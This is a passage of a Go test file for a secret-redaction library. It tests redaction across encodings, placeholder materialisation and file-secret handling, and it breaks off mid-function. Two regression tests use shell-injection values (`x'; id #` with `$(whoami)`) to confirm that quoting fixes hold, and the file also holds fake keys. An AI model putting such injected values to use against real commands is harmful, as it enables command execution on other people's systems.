package secretguard

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

const (
	// A realistic-length fake secret (40 chars) so encodings are long
	// and unique enough to taint safely.
	fakeKey = "sk-ant-FAKE-abcDEF0123456789ghiJKLmnoPQRස" // includes a non-ASCII rune on purpose
	awsKey  = "AKIAIOSFODNN7EXAMPLE"                      // canonical AWS example access key
)

func newTestGuard(t *testing.T, secrets ...Secret) *Guard {
	t.Helper()
	return New(secrets, DefaultConfig())
}

func TestEncodingsOf_CoversFormats(t *testing.T) {
	v := "MyS3cretValue-0123456789"
	encs := encodingsOf(v)
	want := map[string]string{
		"raw":        v,
		"base64 std": base64.StdEncoding.EncodeToString([]byte(v)),
		"base64 url": base64.URLEncoding.EncodeToString([]byte(v)),
		"hex lower":  hex.EncodeToString([]byte(v)),
		"hex upper":  strings.ToUpper(hex.EncodeToString([]byte(v))),
		"url query":  url.QueryEscape(v),
	}
	set := make(map[string]struct{}, len(encs))
	for _, e := range encs {
		set[e] = struct{}{}
	}
	for label, form := range want {
		if _, ok := set[form]; !ok {
			t.Errorf("encodingsOf missing %s form %q", label, form)
		}
	}
}

func TestRedact_KnownValueAllEncodings(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "api_key", Value: fakeKey})
	ph := defaultPlaceholder("api_key")

	cases := map[string]string{
		"raw":        fakeKey,
		"base64 std": base64.StdEncoding.EncodeToString([]byte(fakeKey)),
		"base64 raw": base64.RawStdEncoding.EncodeToString([]byte(fakeKey)),
		"base64 url": base64.URLEncoding.EncodeToString([]byte(fakeKey)),
		"hex":        hex.EncodeToString([]byte(fakeKey)),
		"hex upper":  strings.ToUpper(hex.EncodeToString([]byte(fakeKey))),
		"url query":  url.QueryEscape(fakeKey),
	}
	for label, encoded := range cases {
		in := "prefix " + encoded + " suffix"
		got := g.Redact(in)
		if strings.Contains(got, encoded) && encoded != ph {
			t.Errorf("%s: secret still present after Redact: %q", label, got)
		}
		if !strings.Contains(got, ph) {
			t.Errorf("%s: expected placeholder %q in %q", label, ph, got)
		}
	}
}

func TestRedact_JSONEscapedValue(t *testing.T) {
	// A value with characters that JSON escapes, embedded inside a JSON
	// document the way it would appear in events.jsonl.
	v := `line1
"quoted"\back`
	g := newTestGuard(t, Secret{Name: "tok", Value: v})
	doc := `{"field":"` + jsonEscape(v) + `"}`
	got := g.Redact(doc)
	if strings.Contains(got, jsonEscape(v)) {
		t.Errorf("json-escaped secret survived: %q", got)
	}
	if !strings.Contains(got, defaultPlaceholder("tok")) {
		t.Errorf("expected placeholder in %q", got)
	}
}

func jsonEscape(v string) string {
	// mirror encodingsOf's json form
	for _, e := range encodingsOf(v) {
		if e != v && strings.Contains(e, `\`) {
			return e
		}
	}
	return v
}

func TestMaterialize_RoundTrip(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "deploy_key", Value: fakeKey})
	ph := defaultPlaceholder("deploy_key")
	cmd := `curl -H "Authorization: Bearer ` + ph + `" https://api.example.com`
	got := g.Materialize(cmd)
	if !strings.Contains(got, fakeKey) {
		t.Errorf("Materialize did not substitute real value: %q", got)
	}
	if strings.Contains(got, ph) {
		t.Errorf("placeholder survived Materialize: %q", got)
	}
	// Redact is the inverse on the materialised text.
	if back := g.Redact(got); !strings.Contains(back, ph) || strings.Contains(back, fakeKey) {
		t.Errorf("Redact did not invert Materialize: %q", back)
	}
}

// TestMaterializeShell_SingleQuoteInjection guards the fix for the deepsec
// finding (run 019f02f4): the tool-node template wraps a secret placeholder in
// single quotes, and plain Materialize substituted the RAW value, so a secret
// value containing a single quote broke out of the quoting -> shell injection.
// MaterializeShell escapes the value for inside-single-quote use so the
// surrounding quotes stay balanced and the value is inert shell text.
func TestMaterializeShell_SingleQuoteInjection(t *testing.T) {
	// A hostile secret value that, raw, would close the quote and run `id`.
	const evil = `x'; id #`
	g := newTestGuard(t, Secret{Name: "tok", Value: evil})
	ph := defaultPlaceholder("tok")
	// The template layer emits the placeholder inside single quotes.
	cmd := `deploy --token '` + ph + `'`

	raw := g.Materialize(cmd)
	if !strings.Contains(raw, `'; id #`) {
		t.Fatalf("precondition: raw Materialize should embed the unescaped value: %q", raw)
	}

	got := g.MaterializeShell(cmd)
	// Every single quote in the VALUE must be the escaped form ('\''), so no
	// bare `'` from the value can terminate the surrounding quote. `sh -c got`
	// then passes the literal value `x'; id #` as one arg — `id` never runs.
	want := `deploy --token 'x'\''; id #'`
	if got != want {
		t.Errorf("MaterializeShell = %q; want %q", got, want)
	}
	if strings.Contains(got, ph) {
		t.Errorf("placeholder survived MaterializeShell: %q", got)
	}
}

// TestMaterializeShellEnv_KeepsSecretOutOfCommandText guards the fix for
// the "secret value in subprocess argv" finding: inlining a materialised
// secret INTO the exec'd command string makes it visible via ps /
// /proc/<pid>/cmdline to any co-resident local process for the
// subprocess's lifetime. MaterializeShellEnv instead swaps the quoted
// placeholder for an env-var reference and returns the real value
// out-of-band, so the command text itself never carries the plaintext
// secret — regardless of what characters the value contains, since
// double-quoted parameter expansion does not re-parse the substituted
// value for shell metacharacters.
func TestMaterializeShellEnv_KeepsSecretOutOfCommandText(t *testing.T) {
	const evil = `x'; id # $(whoami) "quoted"`
	g := newTestGuard(t, Secret{Name: "tok", Value: evil})
	ph := defaultPlaceholder("tok")
	cmd := `deploy --token '` + ph + `'`

	gotCmd, env := g.MaterializeShellEnv(cmd)

	if strings.Contains(gotCmd, evil) {
		t.Fatalf("secret value leaked into command text: %q", gotCmd)
	}
	// The placeholder NAME is expected to survive — it doubles as the
	// env-var name in the "$NAME" reference. What must NOT survive is
	// its single-quoted (inline-value) form.
	if strings.Contains(gotCmd, "'"+ph+"'") {
		t.Errorf("quoted placeholder was not converted to an env reference: %q", gotCmd)
	}
	want := `deploy --token "$` + ph + `"`
	if gotCmd != want {
		t.Errorf("gotCmd = %q, want %q", gotCmd, want)
	}
	if env[ph] != evil {
		t.Errorf("env[%q] = %q, want raw value %q", ph, env[ph], evil)
	}
}

// TestMaterializeShellEnv_MultipleSecrets verifies every quoted
// placeholder present in the command is swapped, each into its own env
// entry.
func TestMaterializeShellEnv_MultipleSecrets(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "user", Value: "alice"}, Secret{Name: "pass", Value: "s3cr3t!"})
	userPh, passPh := defaultPlaceholder("user"), defaultPlaceholder("pass")
	cmd := `login --user '` + userPh + `' --pass '` + passPh + `'`

	gotCmd, env := g.MaterializeShellEnv(cmd)

	if strings.Contains(gotCmd, "alice") || strings.Contains(gotCmd, "s3cr3t!") {
		t.Fatalf("secret values leaked into command text: %q", gotCmd)
	}
	want := `login --user "$` + userPh + `" --pass "$` + passPh + `"`
	if gotCmd != want {
		t.Errorf("gotCmd = %q, want %q", gotCmd, want)
	}
	if env[userPh] != "alice" || env[passPh] != "s3cr3t!" {
		t.Errorf("env map incomplete: %#v", env)
	}
}

// TestMaterializeShellEnv_MixedQuotedAndBareFallsBackToInline covers the
// unusual case where the SAME secret is referenced both as
// {{secrets.X}} (quoted) and {{!secrets.X}} (bare) within one command:
// converting only the quoted occurrence to an env-reference while
// leaving the bare one for a later blind substitution would corrupt the
// just-inserted "$PLACEHOLDER" token (the placeholder name is a
// substring of it), so this case conservatively falls back to inline
// materialisation for every occurrence of that placeholder — matching
// MaterializeShell's existing, still-safe (just not argv-hidden) behaviour.
func TestMaterializeShellEnv_MixedQuotedAndBareFallsBackToInline(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "tok", Value: "plain-value"})
	ph := defaultPlaceholder("tok")
	cmd := `echo '` + ph + `' ` + ph

	gotCmd, env := g.MaterializeShellEnv(cmd)

	want := `echo 'plain-value' plain-value`
	if gotCmd != want {
		t.Errorf("gotCmd = %q, want %q", gotCmd, want)
	}
	if len(env) != 0 {
		t.Errorf("expected no env entries for the mixed-usage fallback, got %#v", env)
	}
}

// TestMaterializeShellEnv_UnquotedFallsBackToInline covers the
// {{!secrets.X}} raw/bang form: the template layer never wraps that
// placeholder in single quotes, so env-indirection has no quoted token to
// swap and must fall back to plain MaterializeShell's inline (escaped)
// substitution rather than silently leaving the placeholder unresolved.
func TestMaterializeShellEnv_UnquotedFallsBackToInline(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "tok", Value: "plain-value"})
	ph := defaultPlaceholder("tok")
	cmd := "echo " + ph // no surrounding quotes — the bang/raw form's shape

	gotCmd, env := g.MaterializeShellEnv(cmd)

	if gotCmd != "echo plain-value" {
		t.Errorf("expected inline fallback, got %q", gotCmd)
	}
	if len(env) != 0 {
		t.Errorf("expected no env entries for the inline fallback path, got %#v", env)
	}
}

func TestContainsSecret_DeterministicGate(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "k", Value: fakeKey})
	if !g.ContainsSecret("payload=" + fakeKey) {
		t.Error("ContainsSecret should match raw value")
	}
	b64 := base64.StdEncoding.EncodeToString([]byte(fakeKey))
	if !g.ContainsSecret("blob:" + b64) {
		t.Error("ContainsSecret should match base64 value")
	}
	if g.ContainsSecret("nothing sensitive here, just words and 12345") {
		t.Error("ContainsSecret false positive on benign text")
	}
	// The gate must NOT fire on a heuristic-only token (unknown AWS key).
	if g.ContainsSecret("env AWS_KEY=" + awsKey) {
		t.Error("ContainsSecret must not fire on heuristic-only (unregistered) tokens")
	}
}

func TestFileSecretReferenceRendersPathAndRegistersValue(t *testing.T) {
	g := newTestGuard(t, Secret{
		Name:     "kubeconfig",
		Value:    fakeKey,
		FilePath: "/run/iterion/secrets/kubeconfig",
		Env:      "KUBECONFIG",
	})
	if got := g.ResolveSecretRef("kubeconfig"); got != "/run/iterion/secrets/kubeconfig" {
		t.Fatalf("ResolveSecretRef(file) = %q", got)
	}
	if !g.ContainsSecret("payload=" + fakeKey) {
		t.Fatal("file secret value should remain registered for DLP/redaction")
	}
	hints := g.SecretFileHints()
	if len(hints) != 1 || hints[0].Path != "/run/iterion/secrets/kubeconfig" || hints[0].Env != "KUBECONFIG" {
		t.Fatalf("file hints not preserved: %+v", hints)
	}
}

// TestMaterializeHostFiles_RewritesPathAndWritesValue guards the host
// materialisation seam: on a non-sandbox run, MaterializeHostFiles writes
// each file secret's plaintext to dir/<sanitized-name> (0600) and
// rewrites ResolveSecretRef + SecretFileHints to the HOST path so
// {{secrets.X.path}} resolves to a real file.
func TestMaterializeHostFiles_RewritesPathAndWritesValue(t *testing.T) {
	const payload = "webhook-content-abcdef"
	g := newTestGuard(t, Secret{
		Name:     "webhooks.json",
		Value:    payload,
		FilePath: "/run/iterion/secrets/webhooks.json",
		Env:      "WEBHOOKS_FILE",
	})
	dir := t.TempDir()
	cleanup, err := g.MaterializeHostFiles(dir)
	if err != nil {
		t.Fatalf("MaterializeHostFiles: %v", err)
	}
	if cleanup == nil {
		t.Fatal("cleanup should not be nil")
	}

	wantPath := filepath.Join(dir, "webhooks.json")
	if got := g.ResolveSecretRef("webhooks.json"); got != wantPath {
		t.Errorf("ResolveSecretRef after materialise = %q, want %q", got, wantPath)
	}
	hints := g.SecretFileHints()
	if len(hints) != 1 || hints[0].Path != wantPath {
		t.Fatalf("hints not rewritten: %+v", hints)
	}

	info, err := os.Stat(wantPath)
	if err != nil {
		t.Fatalf("stat host secret file: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("host secret file perms = %v, want 0600", perm)
	}
	b, err := os.ReadFile(wantPath)
	if err != nil {
		t.Fatalf("read host secret file: %v", err)
	}
	if string(b) != payload {
		t.Errorf("host secret content = %q, want %q", string(b), payload)
	}

	cleanup()
	if _, err := os.Stat(wantPath); !os.IsNotExist(err) {
		t.Errorf("cleanup did not remove host secret file: %v", err)
	}
}

// TestMaterializeHostFiles_PrefersRunnerMaterializedMountPath pins the
// fix for the live prod 401 (run 019f8861): on an unsandboxed cloud run
// the runner materialises each file secret at its DECLARED mount path
// and keeps that file LIVE via its mid-run refresh loop — but this seam
// used to snapshot the launch value into a per-run tempdir and re-point
// the agent-facing hint there, so the agent read a frozen token no
// refresher ever touched. When a file already exists at the declared
// path, the hint must keep pointing at it, and a subsequent rotation
// (the runner's atomic rewrite) must be visible through the hinted path.
func TestMaterializeHostFiles_PrefersRunnerMaterializedMountPath(t *testing.T) {
	mountDir := t.TempDir()
	mountPath := filepath.Join(mountDir, "forge_token")
	// The runner's launch-time materialisation.
	if err := os.WriteFile(mountPath, []byte("launch-token"), 0o600); err != nil {
		t.Fatal(err)
	}
	g := newTestGuard(t, Secret{
		Name:     "forge_token",
		Value:    "launch-token-value-long-enough",
		FilePath: mountPath,
	})
	cleanup, err := g.MaterializeHostFiles(t.TempDir())
	if err != nil {
		t.Fatalf("MaterializeHostFiles: %v", err)
	}
	defer cleanup()

	if got := g.ResolveSecretRef("forge_token"); got != mountPath {
		t.Errorf("ResolveSecretRef = %q, want the runner-materialised mount path %q", got, mountPath)
	}
	hints := g.SecretFileHints()
	if len(hints) != 1 || hints[0].Path != mountPath {
		t.Fatalf("hint re-pointed away from the refreshed mount path: %+v", hints)
	}

	// The runner's mid-run refresh rewrites the mount-path file; the agent
	// reading the hinted path must see the ROTATED token.
	if err := os.WriteFile(mountPath+".tmp", []byte("rotated-token"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(mountPath+".tmp", mountPath); err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(hints[0].Path)
	if err != nil {
		t.Fatalf("read hinted path: %v", err)
	}
	if string(b) != "rotated-token" {
		t.Errorf("hinted path content = %q, want the rotated token", string(b))
	}
}

// TestMaterializeHostFiles_SanitisesFilename verifies the host filename
// follows the shared SanitizeFileName rule (non-safe chars → `_`), so a
// secret named e.g. "cluster/kubeconfig" lands under a portable basename
// regardless of the DSL name shape.
func TestMaterializeHostFiles_SanitisesFilename(t *testing.T) {
	g := newTestGuard(t, Secret{
		Name:     "cluster/kubeconfig",
		Value:    "content",
		FilePath: "/run/iterion/secrets/cluster_kubeconfig",
	})
	dir := t.TempDir()
	cleanup, err := g.MaterializeHostFiles(dir)
	if err != nil {
		t.Fatalf("MaterializeHostFiles: %v", err)
	}
	defer cleanup()
	got := g.ResolveSecretRef("cluster/kubeconfig")
	want := filepath.Join(dir, "cluster_kubeconfig")
	if got != want {
		t.Errorf("ResolveSecretRef = %q, want %q", got, want)
	}
	if _, err := os.Stat(want); err != nil {
		t.Errorf("host secret file missing at %q: %v", want, err)
	}
}

// TestMaterializeHostFiles_SkipsEmptyValue mirrors the sandbox skip for
// an Optional file secret with no resolved value: no host file is
// written, and the mount path stays at the pre-materialise value so the
// tool sees the same "no such file" it would in a sandbox.
func TestMaterializeHostFiles_SkipsEmptyValue(t *testing.T) {
	g := newTestGuard(t, Secret{
		Name:     "opt",
		Value:    "",
		FilePath: "/run/iterion/secrets/opt",
	})
	dir := t.TempDir()
	cleanup, err := g.MaterializeHostFiles(dir)
	if err != nil {
		t.Fatalf("MaterializeHostFiles: %v", err)
	}
	defer cleanup()
	if got := g.ResolveSecretRef("opt"); got != "/run/iterion/secrets/opt" {
		t.Errorf("empty-value secret path should be unchanged, got %q", got)
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 0 {
		t.Errorf("no file should be written for empty value, got %v", entries)
	}
}

// TestMaterializeHostFiles_NoFileHints is a no-op safety: a guard with
// only value secrets returns a nil-safe cleanup and no error.
func TestMaterializeHostFiles_NoFileHints(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "token", Value: fakeKey})
	cleanup, err := g.MaterializeHostFiles(t.TempDir())
	if err != nil {
		t.Fatalf("MaterializeHostFiles: %v", err)
	}
	if cleanup == nil {
		t.Fatal("cleanup should not be nil even on no-op")
	}
	cleanup() // must not panic
}

// TestMaterializeHostFiles_NilGuard is the nil-guard no-op path.
func TestMaterializeHostFiles_NilGuard(t *testing.T) {
	var g *Guard
	cleanup, err := g.MaterializeHostFiles("/tmp/does-not-matter")
	if err != nil {
		t.Fatalf("nil guard: %v", err)
	}
	if cleanup == nil {
		t.Fatal("nil guard should still return a callable cleanup")
	}
	cleanup()
}

// TestMaterializeHostFiles_EmptyDirError refuses an empty target dir so
// a caller that forgets to build the tempdir sees a loud failure instead
// of silently writing to CWD.
func TestMaterializeHostFiles_EmptyDirError(t *testing.T) {
	g := newTestGuard(t, Secret{
		Name:     "tok",
		Value:    "v",
		FilePath: "/run/iterion/secrets/tok",
	})
	if _, err := g.MaterializeHostFiles(""); err == nil {
		t.Fatal("expected error on empty dir")
	}
}

func TestRedact_HeuristicUnknownToken(t *testing.T) {
	g := newTestGuard(t) // no known secrets
	in := "leaked: " + awsKey + " end"
	got := g.Redact(in)
	if strings.Contains(got, awsKey) {
		t.Errorf("unknown AWS key not redacted heuristically: %q", got)
	}
	if !strings.Contains(got, DefaultConfig().Marker) {
		t.Errorf("expected marker in %q", got)
	}
}

func TestRedact_RecursiveBase64Decode(t *testing.T) {
	g := newTestGuard(t) // no known secrets; relies on recursive decode
	wrapped := base64.StdEncoding.EncodeToString([]byte(awsKey))
	in := "data " + wrapped + " more"
	got := g.Redact(in)
	if strings.Contains(got, wrapped) {
		t.Errorf("base64-wrapped AWS key not caught by recursive decode: %q", got)
	}
	if !strings.Contains(got, DefaultConfig().Marker) {
		t.Errorf("expected marker after recursive decode: %q", got)
	}
}

func TestRedact_DoesNotOverRedactBenign(t *testing.T) {
	g := newTestGuard(t)
	// A 40-char hex commit hash and a base64 of plain English — neither
	// is a token shape; the generic 0.6 rule is below the 0.7 MinScore,
	// so both must survive.
	commit := "9f1c2b3d4e5f60718293a4b5c6d7e8f901234567"
	benignB64 := base64.StdEncoding.EncodeToString([]byte("the quick brown fox jumps over a dog"))
	in := "commit " + commit + " note " + benignB64
	got := g.Redact(in)
	if !strings.Contains(got, commit) {
		t.Errorf("benign commit hash was over-redacted: %q", got)
	}
	if !strings.Contains(got, benignB64) {
		t.Errorf("benign base64 text was over-redacted: %q", got)
	}
}

func TestNilGuard_NoOp(t *testing.T) {
	var g *Guard
	if got := g.Redact("hello " + awsKey); got != "hello "+awsKey {
		t.Errorf("nil Redact mutated input: %q", got)
	}
	if got := g.Materialize("x"); got != "x" {
		t.Errorf("nil Materialize mutated input: %q", got)
	}
	if g.ContainsSecret("x") {
		t.Error("nil ContainsSecret should be false")
	}
	if g.HasKnownSecrets() {
		t.Error("nil HasKnownSecrets should be false")
	}
}

func TestNew_SkipsShortValues(t *testing.T) {
	g := New([]Secret{{Name: "tiny", Value: "ab"}}, DefaultConfig())
	if g.HasKnownSecrets() {
		t.Error("values shorter than MinLen must not be registered")
	}
}

func TestRedact_PreservesExistingPlaceholder(t *testing.T) {
	g := newTestGuard(t, Secret{Name: "k", Value: fakeKey})
	ph := defaultPlaceholder("k")
	in := "already redacted: " + ph + " ok"
	if got := g.Redact(in); !strings.Contains(got, ph) {
		t.Errorf("existing placeholder was clobbered: %q", got)
	}
}

func TestRedact_HeuristicDisabled(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Heuristic = false
	g := New(nil, cfg)
	in := "leaked: " + awsKey
	if got := g.Redact(in); !strings.Contains(got, awsKey) {
		t.Errorf("heuristic disabled should leave unknown tokens: %q", got)
	}
}

// Unmaterialize is Layer 1's mirror of Materialize: the sink kill switch
// (RedactKnown and Heuristic off) turns Redact into a no-op and leaves it on.
func TestUnmaterializeHoldsWithSinkRedactionOff(t *testing.T) {
	const secret = "s3cr3t-VALUE-7f6e5d4c3b2a"
	off := DefaultConfig()
	off.RedactKnown, off.Heuristic = false, false
	g := New([]Secret{{Name: "DEPLOY_TOKEN", Value: secret}}, off)
	line := "./deploy.sh --token " + secret
	if got := g.Redact(line); got != line {
		t.Fatalf("Redact with the sink switch off = %q, want it untouched", got)
	}
	if got := g.Unmaterialize(line); got != "./deploy.sh --token __ITERION_SECRET_DEPLOY_TOKEN__" {
		t.Fatalf("Unmaterialize = %q", got)
	}
	if got := g.Unmaterialize("ghp_R8tYq3ZkLm2NvB7xW4cD9fH1jP6sQ0aE5uTz"); got != "ghp_R8tYq3ZkLm2NvB7xW4cD9fH1jP6sQ0aE5uTz" {
		t.Fatalf("Unmaterialize touched an unknown token shape: %q", got)
	}
}

// A URL a JS runtime writes back (WebFetch reporting where it was redirected
// from) percent-encodes a space but not "!", "(" or ")": that form is
// registered too.
func TestUnmaterializeRecognisesAURLAJSRuntimeWrote(t *testing.T) {
	g := New([]Secret{{Name: "PW", Value: "correct horse battery staple!9f8e"}, {Name: "P2", Value: "a?b{c} d(e)"}}, DefaultConfig())
	for in, want := range map[string]string{
		"https://h/start?pw=correct%20horse%20battery%20staple!9f8e": "https://h/start?pw=__ITERION_SECRET_PW__",
		"https://h/x?q=a?b{c}%20d(e)":                                "https://h/x?q=__ITERION_SECRET_P2__",
		"https://h/a%3Fb%7Bc%7D%20d(e)/y":                            "https://h/__ITERION_SECRET_P2__/y",
	} {
		if got := g.Unmaterialize(in); got != want {
			t.Fatalf("Unmaterialize(%q) = %q, want %q", in, got, want)
		}
	}
}

// LongestLiteral is the longest text the guard recognises as one value: an
// encoding longer than the value itself counts (the hex form is twice as
// long), and a guard with no known value — or none — recognises nothing.
func TestLongestLiteralCoversEveryEncoding(t *testing.T) {
	const value = "s3cr3t-VALUE-7f6e5d4c3b2a"
	g := New([]Secret{{Name: "A", Value: value}, {Name: "B", Value: "short-but-ok"}}, DefaultConfig())
	var longest int
	for _, enc := range encodingsOf(value) {
		longest = max(longest, len(enc))
	}
	if got := g.LongestLiteral(); got != longest || got < 2*len(value) {
		t.Fatalf("LongestLiteral = %d, want %d (at least the hex form, %d)", got, longest, 2*len(value))
	}
	var none *Guard
	if none.LongestLiteral() != 0 || New(nil, DefaultConfig()).LongestLiteral() != 0 {
		t.Fatal("a guard with no known value recognises some text")
	}
}

// A URL a JS runtime serialised (a fetched URL a tool reports) percent-encodes,
// per the WHATWG URL standard and what Bun and Node do, C0 controls, DEL and
// every byte of a non-ASCII character, plus the set of the component it sits
// in — and leaves "!" raw, which no Go escaper does. Each such form of a known
// value goes back to its placeholder. The expected forms are written by hand.
func TestEveryWHATWGPercentEncodedFormIsRecognised(t *testing.T) {
	for _, c := range []struct{ name, value, url, want string }{
		{"non-ASCII in a query", "mötley crüe!9f8e", "https://h/?pw=m%C3%B6tley%20cr%C3%BCe!9f8e", "https://h/?pw=__ITERION_SECRET_S__"},
		{"quote, angle brackets, apostrophe in a query", `a"b<c>d'e!f`, "https://h/?pw=a%22b%3Cc%3Ed%27e!f", "https://h/?pw=__ITERION_SECRET_S__"},
		{"backtick, quote, angle brackets in a path", "a`b\"c<d>e!f", "https://h/a%60b%22c%3Cd%3Ee!f/x", "https://h/__ITERION_SECRET_S__/x"},
		{"a caret in a path", "a^b|c[d]e-9f8e7d", "https://h/start/a%5Eb|c[d]e-9f8e7d/x", "https://h/start/__ITERION_SECRET_S__/x"},
		{"a fragment", "it's a {secret}`x`", "https://h/start#pw=it's%20a%20{secret}%60x%60", "https://h/start#pw=__ITERION_SECRET_S__"},
		{"userinfo", "p@ss:w0rd x&y", "https://app:p%40ss%3Aw0rd%20x&y@h/", "https://app:__ITERION_SECRET_S__@h/"},
		{"encodeURIComponent", "a b!c&d=e", "https://h/?pw=a%20b!c%26d%3De", "https://h/?pw=__ITERION_SECRET_S__"},
		{"a non-special URL's query", "it's #1 {a}!9f8e", "custom://h/?pw=it's%20%231%20{a}!9f8e", "custom://h/?pw=__ITERION_SECRET_S__"},
		{"URLSearchParams", "Tr0ub4dor&3*horses~x", "https://h/?api_key=Tr0ub4dor%263*horses%7Ex", "https://h/?api_key=__ITERION_SECRET_S__"},
		{"RFC 3986 strict (Python's quote)", "a b!c&d=e", "https://h/?pw=a%20b%21c%26d%3De", "https://h/?pw=__ITERION_SECRET_S__"},
		{"Python's quote() default, which keeps /", "wJalr/K7MDENG+bPx=9f8e", "https://h/?k=wJalr/K7MDENG%2BbPx%3D9f8e", "https://h/?k=__ITERION_SECRET_S__"},
		{"DEL in a query", "ab\x7fcd!ef", "https://h/?pw=ab%7Fcd!ef", "https://h/?pw=__ITERION_SECRET_S__"},
		{"a C0 control in a query", "ab\x01cd!ef", "https://h/?pw=ab%01cd!ef", "https://h/?pw=__ITERION_SECRET_S__"},
	} {
		g := New([]Secret{{Name: "S", Value: c.value}}, DefaultConfig())
		if got := g.Unmaterialize(c.url); got != c.want {
			t.Errorf("%s: Unmaterialize(%q) = %q, want %q", c.name, c.url, got, c.want)
		}
	}
}

// A file's value ends with its newline; a tool printing it drops it (cat, the
// CLI trimming a result): the value without it is recognised too.
func TestAFileSecretIsRecognisedWithoutItsFinalNewline(t *testing.T) {
	const value = "apiVersion: v1\nkind: Secret\npassword: correct horse battery staple!9f8e\n"
	g := New([]Secret{{Name: "KUBE", Value: value}}, DefaultConfig())
	printed := "$ cat kube.yaml\n" + strings.TrimRight(value, "\n")
	if got := g.Unmaterialize(printed); strings.Contains(got, "correct horse") {
		t.Fatalf("Unmaterialize(%q) = %q", printed, got)
	}
	if got := g.Materialize("__ITERION_SECRET_KUBE__"); got != value {
		t.Fatalf("Materialize gives %q, want the value whole", got)
	}
	// The same output carried in a JSON string (a tool result in an event).
	escaped, _ := json.Marshal(strings.TrimRight(value, "\n"))
	inJSON := `{"output":` + string(escaped) + `}`
	if got := g.Unmaterialize(inJSON); strings.Contains(got, "correct horse") {
		t.Fatalf("Unmaterialize(%q) = %q", inJSON, got)
	}
}

// A value without its final newline never takes another secret's literal: the
// other secret's own value keeps its own placeholder.
func TestATrimmedValueNeverTakesAnotherSecretsLiteral(t *testing.T) {
	g := New([]Secret{{Name: "A", Value: "shared-value-1234\n"}, {Name: "B", Value: "shared-value-1234"}}, DefaultConfig())
	if got := g.Unmaterialize("x shared-value-1234 y"); got != "x __ITERION_SECRET_B__ y" {
		t.Fatalf("B's value unmaterialised as %q", got)
	}
	if got := g.Materialize("__ITERION_SECRET_B__"); got != "shared-value-1234" {
		t.Fatalf("B's placeholder materialises as %q", got)
	}
	if got := g.Unmaterialize("shared-value-1234\n"); got != "__ITERION_SECRET_A__" {
		t.Fatalf("A's value unmaterialised as %q", got)
	}
}

// url.searchParams.set / URLSearchParams (WHATWG application/x-www-form-
// urlencoded) — node 24 and bun write "p%7Ess*w0rd+%28x%29%219f8e" for the
// value below; Go's QueryEscape writes "p~ss%2Aw0rd+...".
func TestAURLSearchParamsFormIsRecognised(t *testing.T) {
	const v = "p~ss*w0rd (x)!9f8e"
	g := New([]Secret{{Name: "S", Value: v}}, DefaultConfig())
	in := "https://h/?pw=p%7Ess*w0rd+%28x%29%219f8e"
	if got := g.Unmaterialize(in); got == in {
		t.Fatalf("Unmaterialize(%q) = %q: the URLSearchParams form of the secret is not recognised", in, got)
	}
}

// the spec's own path set, which leaves ^ raw (Chrome, rust-url).
func TestAPathFormThatLeavesTheCaretRawIsRecognised(t *testing.T) {
	const v = "a^b{c}d?!9f8e7d"
	g := New([]Secret{{Name: "S", Value: v}}, DefaultConfig())
	in := "https://h/a^b%7Bc%7Dd%3F!9f8e7d/x"
	if got, want := g.Unmaterialize(in), "https://h/__ITERION_SECRET_S__/x"; got != want {
		t.Fatalf("Unmaterialize(%q) = %q, want %q", in, got, want)
	}
}

// a value without its final newline must not steal another secret's exact
// value: B's value maps to B's placeholder, and what it maps to materialises
// back to that value.
func TestATrimmedFileValueDoesNotStealAnotherSecretsValue(t *testing.T) {
	const pw = "correct horse battery staple!9f8e"
	g := New([]Secret{{Name: "A_FILE", Value: pw + "\n"}, {Name: "B_ENV", Value: pw}}, DefaultConfig())
	out := g.Unmaterialize("login with " + pw + " now")
	if !strings.Contains(out, "__ITERION_SECRET_B_ENV__") {
		t.Errorf("B's own value redacts to %q, want B's placeholder", out)
	}
	if back := g.Materialize(out); back != "login with "+pw+" now" {
		t.Errorf("round trip: Materialize(Unmaterialize(x)) = %q, want %q", back, "login with "+pw+" now")
	}
}

// a CRLF file printed without its line ending.
func TestACRLFFileSecretIsRecognisedWithoutItsLineEnding(t *testing.T) {
	const value = "apiVersion: v1\r\nkind: Secret\r\npassword: correct horse battery staple!9f8e\r\n"
	g := New([]Secret{{Name: "KUBE", Value: value}}, DefaultConfig())
	printed := "$ cat kube.yaml\n" + strings.TrimRight(value, "\r\n")
	if got := g.Unmaterialize(printed); strings.Contains(got, "correct horse") {
		t.Fatalf("Unmaterialize(%q) = %q", printed, got)
	}
}

// a value MinLen long only with its newline registers no shorter
// literal.
func TestATrimmedValueBelowMinLenIsNotRegistered(t *testing.T) {
	g := New([]Secret{{Name: "S", Value: "abcd\n"}}, DefaultConfig())
	if got := g.Unmaterialize("the abcd word"); got != "the abcd word" {
		t.Fatalf("Unmaterialize = %q: a 4-byte literal was registered", got)
	}
}

// a value longer than the bound whose redaction fits in it is
// shown whole and not told cut.
func TestARedactedValueThatFitsIsNotCut(t *testing.T) {
	red := func(s string) string { return strings.ReplaceAll(s, "SECRET-VALUE-0123456789", "[R]") }
	for _, s := range []string{"xx" + "SECRET-VALUE-0123456789", "xxxxxxx" + "SECRET-VALUE-0123456789"} {
		head, cut := RedactHead(s, 10, 100, red)
		if cut || head != red(s) {
			t.Errorf("RedactHead(%q) = %q, cut=%v; want %q, cut=false", s, head, cut, red(s))
		}
	}
}

// Large file secrets — env-sized values ending with a newline, a multi-MiB
// one — never make the guard panic (its panic text would be the secrets) and
// stay recognised in their raw, trimmed, hex and base64 forms.
func TestLargeFileSecretsNeverPanicAndStayRecognised(t *testing.T) {
	file := func(tag string, n int) string {
		var b strings.Builder
		for i := 0; b.Len() < n; i++ {
			fmt.Fprintf(&b, "- name: %s-%06d\n  token: %x\n", tag, i, i*7919)
		}
		return b.String()[:n-1] + "\n"
	}
	var secs []Secret
